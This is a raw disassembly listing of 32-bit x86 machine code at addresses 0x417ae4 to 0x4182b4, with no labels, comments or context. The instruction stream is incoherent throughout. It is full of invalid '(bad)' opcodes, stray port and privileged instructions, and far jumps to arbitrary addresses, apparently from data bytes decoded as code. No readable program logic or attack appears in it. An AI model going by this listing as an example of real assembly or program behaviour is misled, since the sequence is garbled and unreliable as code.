  417ae4:	sbb    esi,DWORD PTR [ebp-0x1f]
  417ae7:	jbe    0x417afc
  417ae9:	fstp   TBYTE PTR [esp+edi*8+0x3417fe04]
  417af0:	sub    ebp,DWORD PTR [ebx-0xfb13d84]
  417af6:	add    BYTE PTR [esi*1-0x464d462],bh
  417afd:	sbb    ah,BYTE PTR [ebx+0x4b44990a]
  417b03:	shl    BYTE PTR [ebx+0x52],cl
  417b06:	sbb    BYTE PTR [ecx+0x0],0xe7
  417b0a:	xchg   ecx,eax
  417b0b:	daa    
  417b0c:	or     al,0xe8
  417b0e:	popa   
  417b0f:	mov    esi,0x59b40c3d
  417b14:	scas   eax,DWORD PTR es:[edi]
  417b15:	inc    edi
  417b16:	pop    eax
  417b17:	int3   
  417b18:	mov    edx,edx
  417b1a:	test   DWORD PTR [ebp+0x16],0x6cbf3c33
  417b21:	or     eax,0x76b863c9
  417b26:	mov    edi,0x952e27f6
  417b2b:	cs js  0x417b7b
  417b2e:	aam    0x51
  417b30:	dec    esp
  417b31:	mov    edx,0x363fd773
  417b36:	mov    al,ds:0x975ea385
  417b3b:	into   
  417b3c:	inc    ebp
  417b3d:	push   0xf1b07bd4
  417b42:	out    0x99,eax
  417b44:	inc    ebx
  417b45:	data16 int 0x4e
  417b48:	jns    0x417b93
  417b4a:	mov    esi,0x8d735b7d
  417b4f:	mov    ecx,eax
  417b51:	rcr    al,0x60
  417b54:	test   al,0x4c
  417b56:	mov    ah,0x89
  417b58:	mov    eax,ds:0x6dd45edb
  417b5d:	xlat   BYTE PTR ds:[ebx]
  417b5e:	out    0x52,al
  417b60:	and    edi,DWORD PTR [eax-0x68]
  417b63:	mov    ecx,0x50d82368
  417b68:	dec    eax
  417b69:	pop    esi
  417b6a:	cmc    
  417b6b:	arpl   bx,sp
  417b6d:	loopne 0x417b77
  417b6f:	adc    BYTE PTR [ebx+esi*4-0x2b],cl
  417b73:	enter  0x8ce9,0xfb
  417b77:	xchg   esp,eax
  417b78:	pop    eax
  417b79:	add    edi,DWORD PTR [ebp-0x1b]
  417b7c:	repz jge 0x417be1
  417b7f:	arpl   sp,bx
  417b81:	fdivr  DWORD PTR [eax-0x4f84afa0]
  417b87:	lock xchg esi,eax
  417b89:	cmp    eax,0x966236ec
  417b8e:	(bad)  
  417b8f:	das    
  417b90:	jmp    0x8d78:0xe3aa0525
  417b97:	call   0x1b3b:0xdef67db8
  417b9e:	or     BYTE PTR [ebx-0x4c],cl
  417ba1:	nop
  417ba2:	xor    esi,DWORD PTR [ebx+0xe]
  417ba5:	push   edx
  417ba6:	les    ecx,FWORD PTR [eax+0x4e]
  417ba9:	dec    ebx
  417baa:	jle    0x417b49
  417bac:	or     al,0xa9
  417bae:	jae    0x417b34
  417bb0:	mov    gs,WORD PTR [ecx]
  417bb2:	std    
  417bb3:	mov    eax,ds:0xa063091
  417bb8:	add    ecx,eax
  417bba:	fist   WORD PTR [ecx+esi*8+0x4a068c48]
  417bc1:	jae    0x417c3a
  417bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bc4:	dec    ebp
  417bc5:	imul   ecx,DWORD PTR [edx+ebp*1-0x18ba1bcd],0xfd9edbc0
  417bd0:	stos   DWORD PTR es:[edi],eax
  417bd1:	repz fidivr WORD PTR [edx]
  417bd4:	mov    ds:0xbe606108,al
  417bd9:	rcl    DWORD PTR [edi-0x79f95da4],0x38
  417be0:	dec    esp
  417be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417be2:	pop    esp
  417be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417be4:	push   ss
  417be5:	sbb    eax,0xc9ece609
  417bea:	loop   0x417bf2
  417bec:	(bad)  
  417bed:	into   
  417bee:	adc    BYTE PTR [eax-0x6e],cl
  417bf1:	fs inc esp
  417bf3:	pusha  
  417bf4:	xchg   edx,esi
  417bf6:	mov    ebx,0xd429f1b1
  417bfb:	fs push ebx
  417bfd:	push   ebp
  417bfe:	jge    0x417c64
  417c00:	add    cl,BYTE PTR [eax-0x5b]
  417c03:	fcom   st(0)
  417c05:	cmp    cl,cl
  417c07:	jns    0x417c1a
  417c09:	adc    ah,BYTE PTR [ebx]
  417c0b:	push   ebx
  417c0c:	out    0xe6,eax
  417c0e:	push   esi
  417c0f:	popa   
  417c10:	dec    edx
  417c11:	mov    ah,0x94
  417c13:	jnp    0x417c89
  417c15:	leave  
  417c16:	push   ecx
  417c17:	rol    edx,0xd9
  417c1a:	xlat   BYTE PTR ds:[ebx]
  417c1b:	cdq    
  417c1c:	inc    eax
  417c1d:	inc    esi
  417c1e:	dec    edx
  417c1f:	jge    0x417c22
  417c21:	lea    edi,cs:[esi-0x6f]
  417c25:	jns    0x417c76
  417c27:	loop   0x417c9c
  417c29:	call   0x3cb513be
  417c2e:	pop    edi
  417c2f:	out    0xe3,eax
  417c31:	pop    esi
  417c32:	sti    
  417c33:	push   edi
  417c34:	push   ebx
  417c35:	dec    esp
  417c36:	js     0x417c3c
  417c38:	jmp    FWORD PTR [edi-0x31a753ce]
  417c3e:	inc    ebp
  417c3f:	ins    DWORD PTR es:[edi],dx
  417c40:	jp     0x417bf9
  417c42:	(bad)  
  417c43:	mov    ebp,0x49a8fd4f
  417c48:	mov    ebx,0x28aa98e9
  417c4d:	pop    es
  417c4e:	rcr    BYTE PTR [eax-0x75],0xba
  417c52:	(bad)  [ebp+0x64]
  417c55:	out    dx,eax
  417c56:	dec    ebx
  417c57:	inc    ebp
  417c58:	neg    BYTE PTR [esi-0x4b87e647]
  417c5e:	inc    ebx
  417c60:	mov    ecx,0x6d33998a
  417c65:	aad    0x36
  417c67:	out    0x77,al
  417c69:	les    edx,FWORD PTR [esi-0x74413ea8]
  417c6f:	push   edi
  417c70:	out    dx,al
  417c71:	pop    edi
  417c72:	cmp    ebp,DWORD PTR [ebx]
  417c74:	arpl   bx,bx
  417c76:	call   0x1d18:0xb775e5bb
  417c7d:	mov    bh,0x14
  417c7f:	push   edx
  417c80:	xor    eax,0xa72f62ce
  417c85:	scas   al,BYTE PTR es:[edi]
  417c86:	(bad)  
  417c87:	mov    cl,0x73
  417c89:	addr16 repnz int 0xdc
  417c8d:	loope  0x417c0f
  417c8f:	mov    edx,0x169b8bd
  417c94:	(bad)  
  417c96:	hlt    
  417c97:	mov    ecx,ds
  417c99:	int3   
  417c9a:	fld    DWORD PTR [ebp-0x54]
  417c9d:	out    dx,eax
  417c9e:	mov    cl,0xc1
  417ca0:	push   cs
  417ca1:	push   ecx
  417ca2:	dec    edx
  417ca3:	sub    eax,0xb00b5094
  417ca8:	lea    ebp,[edi]
  417caa:	cli    
  417cab:	and    DWORD PTR [eax-0x17],edx
  417cae:	ror    DWORD PTR [esi],0x7f
  417cb1:	gs sbb al,al
  417cb4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417cb6:	or     eax,0x69dfb4c6
  417cbb:	cmp    eax,0xbcbd78eb
  417cc0:	pop    es
  417cc1:	jmp    0x417cca
  417cc3:	ins    BYTE PTR es:[edi],dx
  417cc4:	push   esi
  417cc5:	sbb    eax,0x33ed4c60
  417cca:	adc    eax,DWORD PTR [edi+edx*4+0x21a3cb87]
  417cd1:	addr16 aam 0x74
  417cd4:	mov    dh,0xff
  417cd6:	and    DWORD PTR [esi+0x74b38730],ecx
  417cdc:	xor    cl,BYTE PTR [ebx-0x384ce7bb]
  417ce2:	push   ds
  417ce3:	xchg   edi,eax
  417ce4:	xchg   esp,eax
  417ce5:	and    DWORD PTR [ebx+0x769bc1e],ebx
  417ceb:	sar    DWORD PTR [ebx+0x64b34a38],0x20
  417cf2:	popa   
  417cf3:	push   edx
  417cf4:	pusha  
  417cf5:	imul   esp,DWORD PTR [ebx-0x1c],0xffffffcf
  417cf9:	xor    al,BYTE PTR [edi+0x48]
  417cfc:	ffreep st(4)
  417cfe:	ds mov bl,0x88
  417d01:	sub    edx,DWORD PTR [ecx]
  417d03:	rol    DWORD PTR [edx-0x1c],0xf1
  417d07:	mov    bh,0x1c
  417d09:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  417d0b:	dec    edx
  417d0c:	scas   al,BYTE PTR es:[edi]
  417d0d:	xlat   BYTE PTR ds:[ebx]
  417d0e:	adc    BYTE PTR [ebp-0x3af5a6de],ah
  417d14:	adc    al,0x80
  417d16:	cmp    eax,0x633c75d
  417d1b:	xor    DWORD PTR [edx+0x3cc894b0],esp
  417d21:	call   0xf7810cb5
  417d26:	dec    ebp
  417d27:	sahf   
  417d28:	jmp    0x11212850
  417d2d:	scas   al,BYTE PTR es:[edi]
  417d2e:	and    ecx,0x570d63d
  417d34:	adc    eax,esp
  417d36:	data16 loop 0x417cf1
  417d39:	push   eax
  417d3a:	push   ebx
  417d3b:	cmp    eax,0xc5d84107
  417d40:	(bad)  
  417d41:	aad    0xf3
  417d43:	lods   al,BYTE PTR ds:[esi]
  417d44:	adc    BYTE PTR [edx+eax*8-0x70c1e13],0xbc
  417d4c:	in     al,dx
  417d4d:	stc    
  417d4e:	setno  bl
  417d51:	xchg   ebp,eax
  417d52:	sbb    DWORD PTR [esi-0x71fa4738],esp
  417d58:	hlt    
  417d59:	out    0xe7,al
  417d5b:	or     ah,BYTE PTR [si-0x60]
  417d5f:	cwde   
  417d60:	inc    edx
  417d61:	inc    esi
  417d62:	jae    0x417d3d
  417d64:	clc    
  417d65:	mov    dl,0x12
  417d67:	cli    
  417d68:	add    al,BYTE PTR [edx-0x5b]
  417d6b:	jnp    0x417d12
  417d6d:	ror    DWORD PTR [esi-0x69e9bf14],0x10
  417d74:	mov    ds:0xc3072fb1,eax
  417d79:	stos   DWORD PTR es:[edi],eax
  417d7a:	in     al,dx
  417d7b:	or     DWORD PTR [ecx-0x70],edx
  417d7e:	into   
  417d7f:	cs sbb eax,0xd29b20ce
  417d85:	add    eax,DWORD PTR [ebp-0x51630a11]
  417d8b:	cs sbb al,0xc9
  417d8e:	outs   dx,BYTE PTR ds:[esi]
  417d8f:	add    esi,DWORD PTR [ebx]
  417d91:	add    ah,BYTE PTR [ecx]
  417d93:	xor    eax,0xd53dde59
  417d98:	jg     0x417db4
  417d9a:	jle    0x417d3c
  417d9c:	mov    esi,0x29a395dc
  417da1:	into   
  417da2:	(bad)  
  417da3:	in     al,0xb5
  417da5:	adc    DWORD PTR [edx+0x75515602],esp
  417dab:	sub    BYTE PTR ds:0xfd8b0991,0xa8
  417db2:	add    eax,ebx
  417db4:	ins    BYTE PTR es:[edi],dx
  417db5:	push   cs
  417db6:	lds    eax,FWORD PTR [edi+0x24]
  417db9:	rcl    DWORD PTR [ecx],0xfb
  417dbc:	lods   al,BYTE PTR ds:[esi]
  417dbd:	xchg   edx,eax
  417dbe:	jecxz  0x417df7
  417dc0:	(bad)  
  417dc1:	stos   DWORD PTR es:[edi],eax
  417dc2:	in     eax,dx
  417dc3:	sub    BYTE PTR [edx-0x4a63eb90],ah
  417dc9:	adc    eax,0xa287495f
  417dce:	les    eax,FWORD PTR [ecx]
  417dd0:	loope  0x417ddc
  417dd2:	aad    0xeb
  417dd4:	int    0x13
  417dd6:	mov    ebx,0x2f8fb054
  417ddb:	call   0x353d929a
  417de0:	jnp    0x417db7
  417de2:	loop   0x417e3d
  417de4:	push   0x49
  417de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de7:	xor    ch,BYTE PTR [edi+edi*1]
  417dea:	mov    bl,0xd2
  417dec:	call   0x4b0a:0x7e829350
  417df3:	pop    eax
  417df4:	dec    ebp
  417df5:	mov    WORD PTR [edi],gs
  417df7:	stos   DWORD PTR es:[edi],eax
  417df8:	mul    BYTE PTR [edi+ecx*8+0x198994ed]
  417dff:	mov    ds:0xdca5ffc0,al
  417e04:	cli    
  417e05:	add    al,0x54
  417e07:	sbb    BYTE PTR [esi-0x5f7a764b],0x24
  417e0e:	pop    edi
  417e0f:	int    0x2f
  417e11:	inc    edi
  417e12:	push   cs
  417e13:	loope  0x417e34
  417e15:	(bad)  
  417e16:	aaa    
  417e17:	cmp    al,0xd8
  417e19:	adc    bh,BYTE PTR [esi+0x2e]
  417e1c:	inc    ebx
  417e1d:	imul   ebx,DWORD PTR [esi-0x6d5cca5a],0xf0197d0d
  417e27:	mov    al,ds:0x1bedba00
  417e2c:	xchg   edx,eax
  417e2d:	jecxz  0x417eac
  417e2f:	xor    eax,0x686049a2
  417e34:	mov    cl,0x43
  417e36:	push   edi
  417e37:	and    eax,0xa85f8714
  417e3c:	mov    bh,0xf9
  417e3e:	xchg   ebx,eax
  417e3f:	xor    al,0x64
  417e41:	xchg   esp,eax
  417e42:	add    eax,0xcbf701a0
  417e47:	pmulhuw mm0,QWORD PTR [ebx-0xec2e590]
  417e4e:	push   ebp
  417e4f:	adc    esi,DWORD PTR [eax-0x7db8a6a0]
  417e55:	stos   BYTE PTR es:[edi],al
  417e56:	sub    edx,eax
  417e58:	or     ebp,DWORD PTR [ecx]
  417e5a:	jae    0x417e97
  417e5c:	xor    eax,0xe9cdb87f
  417e61:	cmp    ebp,esp
  417e63:	cld    
  417e64:	fidivr DWORD PTR [edx-0x1]
  417e67:	sti    
  417e68:	cmp    ebp,edi
  417e6a:	xlat   BYTE PTR ds:[ebx]
  417e6b:	bound  edi,QWORD PTR [eax+0x4d620e42]
  417e71:	jns    0x417e4e
  417e73:	bound  edx,QWORD PTR [edx-0x1e]
  417e76:	fwait
  417e77:	out    0xf1,eax
  417e79:	(bad)  
  417e7a:	out    dx,al
  417e7b:	lock into 
  417e7d:	out    0x18,eax
  417e7f:	sbb    bl,bl
  417e81:	add    BYTE PTR [esi-0x51],dl
  417e84:	repz mov ds:0x7a9b09c6,al
  417e8a:	jmp    0x2cbb:0x5e1202d4
  417e91:	push   cs
  417e92:	jns    0x417ebb
  417e94:	bound  ebx,QWORD PTR [esi+0x1057412b]
  417e9a:	and    al,0x77
  417e9c:	jl     0x417e29
  417e9e:	cmp    al,0x97
  417ea0:	adc    al,0x21
  417ea2:	sbb    al,0x4f
  417ea4:	mov    ecx,0x656b6a88
  417ea9:	add    BYTE PTR [esp+eax*1+0x516bf0ff],dl
  417eb0:	mov    esi,0x328ec284
  417eb5:	out    dx,eax
  417eb6:	in     al,dx
  417eb7:	mov    al,ds:0x4404d20
  417ebc:	sbb    cl,0x8e
  417ebf:	push   cs
  417ec0:	mov    esp,eax
  417ec2:	int3   
  417ec3:	(bad)  [ecx+0x40]
  417ec6:	jns    0x417e87
  417ec8:	xor    dl,al
  417eca:	fcomp  QWORD PTR [edi]
  417ecc:	and    al,0x31
  417ece:	jnp    0x417f05
  417ed0:	inc    edx
  417ed1:	or     BYTE PTR [esp+edi*8+0x5f],dh
  417ed5:	fmul   DWORD PTR [edi-0x645f5de2]
  417edb:	inc    esp
  417edc:	add    eax,edi
  417ede:	mov    ds:0xf616c5ac,al
  417ee3:	scas   al,BYTE PTR es:[edi]
  417ee4:	jecxz  0x417f25
  417ee6:	and    DWORD PTR [ecx+0x21],eax
  417ee9:	mov    ch,0xda
  417eeb:	inc    edi
  417eec:	retf   
  417eed:	pop    ecx
  417eee:	xchg   ebx,eax
  417eef:	dec    esi
  417ef0:	xor    eax,0xce3d31ba
  417ef5:	and    dl,cl
  417ef7:	div    edx
  417ef9:	xor    dh,0xef
  417efc:	pusha  
  417efd:	(bad)  
  417efe:	imul   esp,DWORD PTR [eax],0xffffffce
  417f01:	imul   edi,DWORD PTR [ecx-0x48],0xffffff85
  417f05:	(bad)  
  417f06:	jmp    0x8c3:0xa2518745
  417f0d:	(bad)  
  417f0e:	fcmovnb st,st(1)
  417f10:	test   DWORD PTR [ecx+0x5a],eax
  417f13:	xor    esi,DWORD PTR [esi+0x1f683e08]
  417f19:	icebp  
  417f1a:	imul   edx,esp,0xffffffd4
  417f1d:	mov    edx,0xb2646ed6
  417f22:	(bad)  
  417f23:	pop    eax
  417f24:	add    al,0xcc
  417f26:	add    al,0xf3
  417f28:	es ja  0x417f91
  417f2b:	adc    eax,0x79cb4e41
  417f30:	stc    
  417f31:	mov    eax,ds:0xc67f1ce4
  417f36:	out    0x45,al
  417f38:	push   eax
  417f39:	(bad)  
  417f3a:	mov    dl,0x20
  417f3c:	(bad)  
  417f3d:	ja     0x417f7d
  417f3f:	xchg   esp,eax
  417f40:	inc    edi
  417f41:	dec    esp
  417f42:	mov    edi,DWORD PTR [edx-0x41]
  417f45:	bound  edi,QWORD PTR [edi-0x11]
  417f48:	sar    BYTE PTR [ecx-0x3c],cl
  417f4b:	or     eax,0xe644d636
  417f50:	loopne 0x417f4f
  417f52:	fst    DWORD PTR [ebp+0x2c]
  417f55:	ret    0x7d48
  417f58:	mov    ch,0x91
  417f5a:	mov    eax,0x8547a090
  417f5f:	and    al,0x43
  417f61:	out    dx,al
  417f62:	int3   
  417f63:	ret    0xb2fb
  417f66:	jmp    0x417f1b
  417f68:	jge    0x417f87
  417f6a:	ins    DWORD PTR es:[edi],dx
  417f6b:	push   cs
  417f6c:	inc    ebx
  417f6d:	imul   esp,ebp,0x59
  417f70:	in     al,0xdd
  417f72:	daa    
  417f73:	xor    ah,bl
  417f75:	cmp    ah,BYTE PTR [eax+ebp*1+0x436b5c47]
  417f7c:	or     BYTE PTR [eax],al
  417f7e:	push   ebp
  417f7f:	mov    eax,ds:0xcf9bd126
  417f84:	jb     0x417f3c
  417f86:	pop    ebp
  417f87:	add    DWORD PTR [ecx+edx*1-0x70],edi
  417f8b:	sbb    ah,BYTE PTR [ecx-0x13]
  417f8e:	or     al,0xd7
  417f90:	mov    ch,0x1
  417f92:	jns    0x417fef
  417f94:	jns    0x417f47
  417f96:	push   ebp
  417f97:	pop    edi
  417f98:	sbb    ecx,ecx
  417f9a:	mov    al,ds:0x184ba3e8
  417f9f:	jp     0x417f2a
  417fa1:	add    ecx,eax
  417fa3:	hlt    
  417fa4:	add    eax,0x2df03bbe
  417fa9:	mov    BYTE PTR [eax+0x4],dh
  417fac:	mov    cl,0x37
  417fae:	out    0x35,al
  417fb0:	mov    ds:0x18b998fe,al
  417fb5:	test   al,dh
  417fb7:	stos   DWORD PTR es:[edi],eax
  417fb8:	das    
  417fb9:	add    bh,cl
  417fbb:	cs push ebx
  417fbd:	xchg   esp,eax
  417fbe:	jbe    0x417fee
  417fc0:	dec    ebx
  417fc1:	nop
  417fc2:	sbb    edx,eax
  417fc4:	shl    DWORD PTR [ebp+ebp*8-0x7c447a1e],1
  417fcb:	add    esp,DWORD PTR [ecx+ebx*8]
  417fce:	push   esi
  417fcf:	test   DWORD PTR [edx-0x624728b3],ebp
  417fd5:	and    al,0x3e
  417fd7:	mov    eax,0x66deb3c0
  417fdc:	loope  0x418022
  417fde:	cwde   
  417fdf:	and    DWORD PTR [eax+eax*2],eax
  417fe2:	jmp    0x418028
  417fe4:	(bad)  
  417fe5:	cmp    bl,BYTE PTR [ebp+0x6c1ba573]
  417feb:	shl    BYTE PTR [edi+0x31],1
  417fee:	out    dx,eax
  417fef:	fistp  DWORD PTR [eax+0x1e805916]
  417ff5:	lea    edi,[esi+0x46]
  417ff8:	dec    edx
  417ff9:	or     dh,BYTE PTR [ebx]
  417ffb:	arpl   WORD PTR [eax+0x273e6ed0],bx
  418001:	cld    
  418002:	xchg   ecx,eax
  418003:	cdq    
  418004:	inc    edi
  418005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418006:	or     dl,al
  418008:	neg    DWORD PTR [ebx+0x2f]
  41800b:	rol    BYTE PTR [ecx+ecx*8-0x7c],cl
  41800f:	add    BYTE PTR [edx+0xf],ch
  418012:	push   edx
  418013:	mov    cl,0xb5
  418015:	in     eax,dx
  418016:	push   edi
  418017:	out    dx,eax
  418018:	inc    ebx
  418019:	out    dx,al
  41801a:	sub    al,0x6e
  41801c:	mov    ebx,0x642d3a57
  418021:	sub    esi,DWORD PTR cs:[eax+0x739a080e]
  418028:	cmp    bl,dh
  41802a:	sar    DWORD PTR [edx],cl
  41802c:	stos   DWORD PTR es:[edi],eax
  41802d:	and    DWORD PTR [eax-0x3eab6651],esi
  418033:	aad    0x77
  418035:	adc    dh,ch
  418037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418038:	test   eax,ebp
  41803a:	leave  
  41803b:	cli    
  41803c:	fwait
  41803d:	push   eax
  41803e:	jg     0x41805a
  418040:	add    eax,0x9e22e3d2
  418045:	(bad)  
  418046:	in     eax,dx
  418047:	xlat   BYTE PTR ds:[ebx]
  418048:	xchg   esp,eax
  418049:	sar    bh,0x57
  41804c:	jmp    0x418005
  41804e:	fcom   DWORD PTR ds:0xe27806d6
  418054:	jno    0x41809b
  418056:	and    bl,BYTE PTR [eax]
  418058:	mov    bl,0x31
  41805a:	dec    edi
  41805b:	in     eax,0xc6
  41805d:	(bad)  
  41805e:	(bad)  
  41805f:	sti    
  418060:	pop    esi
  418061:	jo     0x418000
  418063:	ret    0x28ea
  418066:	loop   0x418056
  418068:	xchg   ecx,eax
  418069:	push   ss
  41806a:	bound  ebp,QWORD PTR [ebp+0x5287c4c2]
  418070:	repnz pop edi
  418072:	shl    DWORD PTR [esi],1
  418074:	xchg   ebx,eax
  418075:	lods   al,BYTE PTR ds:[esi]
  418076:	add    BYTE PTR [ecx-0x12],dh
  418079:	pop    es
  41807a:	lea    ecx,[ebx]
  41807c:	outs   dx,BYTE PTR ds:[esi]
  41807d:	dec    esi
  41807e:	pop    ss
  41807f:	or     bl,BYTE PTR [edi+0x71b17627]
  418085:	dec    edi
  418086:	and    DWORD PTR [eax-0x4c],esp
  418089:	and    eax,0x4c0ba172
  41808e:	inc    eax
  41808f:	popa   
  418090:	imul   eax,DWORD PTR [ebx-0x2a],0x4b
  418094:	pop    esp
  418095:	jmp    edx
  418097:	pop    ecx
  418098:	push   ebx
  418099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41809a:	out    dx,al
  41809b:	pusha  
  41809c:	ss loop 0x418020
  41809f:	ror    ecx,cl
  4180a1:	dec    ebx
  4180a2:	push   cs
  4180a3:	inc    edx
  4180a4:	shl    DWORD PTR [eax],0xa5
  4180a7:	test   al,0xc7
  4180a9:	add    BYTE PTR [ebp+0x5f90dd04],bh
  4180af:	in     eax,dx
  4180b0:	mov    al,ds:0x1ffee8b
  4180b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180b6:	lea    ebp,fs:[eax+edx*2]
  4180ba:	push   esp
  4180bb:	jg     0x4180f7
  4180bd:	xchg   DWORD PTR [edi+0x2f],edi
  4180c0:	rol    DWORD PTR [esi+0x43f2e339],cl
  4180c6:	mov    cl,0x4e
  4180c8:	cli    
  4180c9:	jp     0x418067
  4180cb:	call   0x97ffe003
  4180d0:	mov    edi,0x7d9aa9b4
  4180d5:	shr    DWORD PTR [ebx+0x0],0x35
  4180d9:	shl    BYTE PTR ds:0x707bef40,cl
  4180df:	fwait
  4180e0:	or     ch,dh
  4180e2:	mov    ch,BYTE PTR [ecx]
  4180e4:	pop    edi
  4180e5:	aad    0x4b
  4180e7:	push   ebp
  4180e8:	test   eax,0x40482cdf
  4180ed:	es xchg ch,ah
  4180f0:	enter  0x53c2,0xb3
  4180f4:	bound  edi,QWORD PTR [si]
  4180f7:	cwde   
  4180f8:	mov    dh,0xd
  4180fa:	ins    DWORD PTR es:[edi],dx
  4180fb:	xor    DWORD PTR [ecx+0x4b8932b8],0x52
  418102:	and    ch,ah
  418104:	jmp    0xfaaa4102
  418109:	bound  ecx,QWORD PTR [ebx-0x53]
  41810c:	cld    
  41810d:	(bad)  
  41810e:	loopne 0x418159
  418110:	jmp    0x94d4:0x5df235f5
  418117:	cmp    eax,0xe1a7e9f3
  41811c:	xchg   esp,eax
  41811d:	test   eax,0x80c9cbbf
  418122:	das    
  418123:	pusha  
  418124:	xchg   ebx,eax
  418125:	std    
  418126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418127:	mov    bl,0x43
  418129:	add    BYTE PTR [edi-0x1f00fee9],cl
  41812f:	adc    ch,dh
  418131:	(bad)  
  418132:	mov    ch,0xcc
  418134:	pop    ss
  418135:	jno    0x418169
  418137:	(bad)  
  418138:	sbb    bl,BYTE PTR [ecx]
  41813a:	jbe    0x418148
  41813c:	jbe    0x41811a
  41813e:	into   
  41813f:	and    edx,DWORD PTR [ebx+0x31]
  418142:	fisub  DWORD PTR [ebx-0x1a]
  418145:	jbe    0x4180d3
  418147:	inc    edx
  418148:	xchg   esp,eax
  418149:	inc    edi
  41814a:	lea    ebx,[ecx+0x10]
  41814d:	std    
  41814e:	ret    
  41814f:	adc    ebx,DWORD PTR [edi]
  418151:	jmp    0xcb6025c0
  418156:	loope  0x4180f9
  418158:	push   edx
  418159:	xchg   dl,ch
  41815b:	sbb    ecx,DWORD PTR [esi+edx*8+0x34]
  41815f:	inc    edi
  418160:	scas   eax,DWORD PTR es:[edi]
  418161:	pop    esp
  418162:	dec    eax
  418163:	cdq    
  418164:	fistp  QWORD PTR [ebx+0x2f]
  418167:	fistp  QWORD PTR [edx]
  418169:	add    edx,DWORD PTR [edi+0x41]
  41816c:	rol    DWORD PTR [esp+esi*1],1
  41816f:	cmp    DWORD PTR [edi-0x4c44bac],0xffffffe0
  418176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418177:	(bad)  
  418178:	leave  
  418179:	jmp    0x4181bb
  41817b:	sti    
  41817c:	pop    esp
  41817d:	mov    eax,ds:0x50e22061
  418182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418183:	adc    eax,0x787fc287
  418188:	push   esp
  418189:	sbb    eax,0xe3d503af
  41818e:	adc    BYTE PTR [ecx+0x64f4c66a],0xbc
  418195:	outs   dx,BYTE PTR ds:[si]
  418197:	fld    TBYTE PTR [esi-0xe55fd6f]
  41819d:	std    
  41819e:	bound  ebx,QWORD PTR [eax]
  4181a0:	call   0xbbbadb90
  4181a5:	dec    eax
  4181a6:	fcmove st,st(1)
  4181a8:	sar    DWORD PTR [ebx],1
  4181aa:	cmp    bh,BYTE PTR [edx-0xd43e012]
  4181b0:	adc    bh,dl
  4181b2:	xchg   edx,eax
  4181b3:	xchg   edi,eax
  4181b4:	xor    DWORD PTR [eax+0x21],eax
  4181b7:	or     ebx,edi
  4181b9:	ficom  DWORD PTR [ebx-0x3b]
  4181bc:	js     0x418221
  4181be:	sbb    DWORD PTR [bx+di+0x740b],edi
  4181c3:	add    DWORD PTR [esi],0x7a
  4181c6:	loop   0x418189
  4181c8:	gs out dx,eax
  4181ca:	pop    edi
  4181cb:	cli    
  4181cc:	sub    eax,0xa3e6b01a
  4181d1:	push   esi
  4181d2:	and    ch,BYTE PTR [ecx+esi*4-0x46]
  4181d6:	call   0x301ab640
  4181db:	jmp    0xea31aa78
  4181e0:	cmp    eax,0x97ad11d2
  4181e5:	or     eax,0xff2e6fef
  4181ea:	jge    0x4181ce
  4181ec:	cwde   
  4181ed:	aad    0xff
  4181ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181f0:	fdiv   DWORD PTR [esi-0x18]
  4181f3:	inc    eax
  4181f4:	cld    
  4181f5:	xchg   ebp,eax
  4181f6:	jle    0x41824a
  4181f8:	aas    
  4181f9:	mov    DWORD PTR [ebx-0x20],eax
  4181fc:	xchg   ebp,eax
  4181fd:	add    DWORD PTR [edi+0x560a9d3e],edx
  418203:	mov    DWORD PTR [edx-0x3b],eax
  418206:	mov    ds:0xf194bb46,eax
  41820b:	rol    BYTE PTR [eax+0x44],1
  41820e:	xchg   ebx,eax
  41820f:	cmp    dl,al
  418211:	add    BYTE PTR [edx-0xe37c16d],al
  418217:	add    al,0x69
  418219:	test   BYTE PTR [ecx+0x5f462067],al
  41821f:	jge    0x4181b0
  418221:	cwde   
  418222:	mov    cl,0x98
  418224:	jle    0x41820a
  418226:	into   
  418227:	in     al,0x84
  418229:	loope  0x418237
  41822b:	jno    0x4181ca
  41822d:	test   BYTE PTR [edx+eax*4-0x18],dh
  418231:	sub    ebx,DWORD PTR ds:0xaaa2dc8b
  418237:	jnp    0x418297
  418239:	call   FWORD PTR [ecx-0x63]
  41823c:	data16 fmul DWORD PTR [eax+0x5b9d14d]
  418243:	in     al,dx
  418244:	retf   
  418245:	pushf  
  418246:	push   eax
  418247:	aaa    
  418248:	test   DWORD PTR [ebx-0x64],ecx
  41824b:	mov    bh,0xc6
  41824d:	mov    bh,0xac
  41824f:	(bad)  
  418250:	pop    bp
  418252:	xor    eax,0x61991cce
  418257:	pop    es
  418258:	dec    esp
  418259:	jp     0x4181ee
  41825b:	cld    
  41825c:	loop   0x41826b
  41825e:	fld    QWORD PTR [ebx+0x96ecb15]
  418264:	sub    DWORD PTR [edi+0x7e62dc4d],ebp
  41826a:	je     0x418235
  41826c:	test   ah,al
  41826e:	icebp  
  41826f:	ucomiss xmm6,DWORD PTR [edi+ecx*2]
  418273:	sbb    ecx,DWORD PTR [edi]
  418275:	loopne 0x41825a
  418277:	sti    
  418278:	xchg   edx,eax
  418279:	idiv   ch
  41827b:	leave  
  41827c:	mov    al,ds:0xac39e185
  418281:	add    esp,edi
  418283:	out    0xf5,al
  418285:	mov    ch,0xb2
  418287:	add    DWORD PTR [eax+eiz*1+0x4b],ebp
  41828b:	adc    al,0x25
  41828d:	in     al,0x87
  41828f:	das    
  418290:	xchg   edx,eax
  418291:	repz jmp 0xb7a250b4
  418297:	icebp  
  418298:	(bad)
  41829d:	sub    cl,BYTE PTR ds:0x7627678e
  4182a3:	sub    esp,DWORD PTR [esi+eax*1-0x1c43d19d]
  4182aa:	jmp    0x7491:0xa7107369
  4182b1:	pusha  
  4182b2:	ss popf 
  4182b4:	rcl    DWORD PTR [ebx+ebx*4-0x6fb55b50],cl
